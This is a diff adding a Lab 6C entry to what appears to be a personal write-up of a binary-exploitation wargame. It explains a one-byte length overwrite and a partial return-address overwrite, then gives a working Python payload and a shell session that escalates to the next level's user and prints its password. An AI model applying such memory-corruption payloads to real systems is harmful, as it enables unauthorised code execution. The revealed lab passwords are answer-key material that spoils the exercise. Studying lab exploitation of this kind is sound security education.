@@ -270,3 +270,30 @@ uid=1020(lab5A) gid=1021(lab5A) euid=1021(lab5end) groups=1022(lab5end),1001(gam
 cat ~lab5end/.pass
 byp4ss1ng_d3p_1s_c00l_am1rite
 ```
+
+## Lab 6
+### Lab 6C
+* Write a 40 char name and a 140 char tweet.
+* We can write one byte into msglen, which determines how many chars we write into the tweet. We can then overflow in RA.
+* There is no data leak, so we can't really explicitly put in the address of `secret_backdoor`. Need to use a partial overwrite.
+* Last 12 bits of the address of `secret_backdoor` is always 0xX72b.
+  * We can overwrite the 2 LSB of the RA, then have a 1/16 chance of getting it correct.
+  * Will use 0x372b, since that's an easy "+7" in ASCII.
+* Need to write exactly 198 bytes, so need to overwrite the msglen to that value.
+
+(python -c "print 'A'*40+'\xc6\n'+'B'*196+'+7\n/bin/sh'"; cat -) |./lab6C
+
+```bash
+lab6C@warzone:/levels/lab06$ (python -c "print 'A'*40+'\xc6\n'+'B'*196+'+7\n/bin/sh'"; cat -) |./lab6C
+--------------------------------------------
+|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: Tweet @Unix-Dude
+>>: >: Tweet sent!
+
+id
+uid=1022(lab6C) gid=1023(lab6C) euid=1023(lab6B) groups=1024(lab6B),1001(gameuser),1023(lab6C)
+cat ~lab6B/.pass
+p4rti4l_0verwr1tes_r_3nuff
+```
